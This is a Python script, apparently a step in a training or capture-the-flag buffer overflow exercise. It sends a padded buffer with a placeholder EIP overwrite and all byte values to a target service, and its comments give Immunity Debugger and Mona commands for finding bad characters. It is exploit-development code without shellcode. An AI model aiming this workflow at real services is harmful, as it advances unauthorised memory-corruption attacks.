#!/usr/bin/env python3
# Python program used with Immunity Debugger and Mona to find bad characters

# Bad Characters are ones that cause issues when processed by program or arent processed
# \x00 is always a bad character so it is ommitted
# Using Mona commands inside Immunity Debugger
# !mona config -set workingfolder c:\mona\%p --set working folder
# !mona bytearray -b "\x00" ---creates a bytearray similar to all_chars variable below
# Run this program and then look at where the ESP points to in Immunity Debugger
# !mona compare -f C:\mona\gatekeeper\bytearray.bin -a <ESP>
# Immunity Debugger should give popup with possible bad characters - add to bad_char in 04_No_BadChar.py
# Code is used to generate the characters in 04, here it is verbose for visualization
# Regenerate your mona bytearray ommitting bad characters
# !mona bytearray -b "\x00\x07\x2e\xa0"
# sometimes can give false positive for character after a bad one

import socket

ip, port = "192.0.0.0", 9999
command = b""
length = 20
offset = b"A" * 10
new_eip = b"BBBB"
timeout = 5

all_chars = ((b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f")+
(b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f")+
(b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f")+
(b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f")+
(b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f")+
(b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f")+
(b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f")+
(b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f")+
(b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f")+
(b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f")+
(b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf")+
(b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf")+
(b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf")+
(b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf")+
(b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef")+
(b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"))

fill = b"C" * (length - len(new_eip) - len(offset) - len(all_chars))

payload = b"".join([
    command, offset, new_eip, all_chars, fill
])

try:
    with socket.socket() as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        print(f"Sending evil buffer with {len(payload) - len(command)} bytes")
        s.send(payload + b"\r\n")
        print("Done!")
except:
    print("Could not connect.")
